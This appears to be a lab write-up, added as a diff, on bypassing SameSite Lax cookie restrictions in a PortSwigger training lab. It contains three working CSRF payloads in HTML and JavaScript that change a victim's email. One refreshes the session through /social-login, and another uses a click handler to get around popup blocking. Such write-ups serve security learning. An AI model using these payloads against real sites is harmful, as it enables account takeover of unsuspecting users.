@@ -1,0 +1,66 @@
+Lab #10: SameSite Lax bypass via cookie refresh
+
+
+Target:  changes the victim's email address
+
+This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address.
+
+Analysis:
+
+
+   There is a csrf vulnerability in change email and no csrf token is provided.
+
+   the normal attack script is successful when the user has logged in, in less than past 2 minutes
+
+   <html>
+                    <body>
+                        <form action="https://myPOrtSwiggerID.web-security-academy.net/my-account/change-email" method="POST">
+                            <input type="hidden" name="email" value="pwned1@evil-user.net" />
+                        </form>
+                        <script>
+                            document.forms[0].submit();
+                        </script>
+                    </body>
+    </html>
+
+
+   but if not, the victim should log in again and the attack is not successful
+
+   To referesh the session and bypass SameSite restriction:
+
+   note that viewing /social-login cause updating the session cookie automatically when the user is already logged in.
+
+   so:
+
+
+ <form method="POST" action="https://myPOrtSwiggerID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned1@web-security-academy.net">
+</form>
+<script>
+    window.open('https://myPOrtSwiggerID.web-security-academy.net/social-login');
+   <! ––  run the changeEmail functionn after 5 seconds --> 
+    setTimeout(changeEmail, 5000);
+
+    function changeEmail(){
+        document.forms[0].submit();
+    }
+</script>
+
+But running the exploit results in blocking popups.
+
+We need some user interaction:
+
+<form method="POST" action="https://myPOrtSwiggerID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@portswigger.net">
+</form>
+<p>Click anywhere on the page</p>
+<script>
+    window.onclick = () => {
+        window.open('https://myPOrtSwiggerID.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
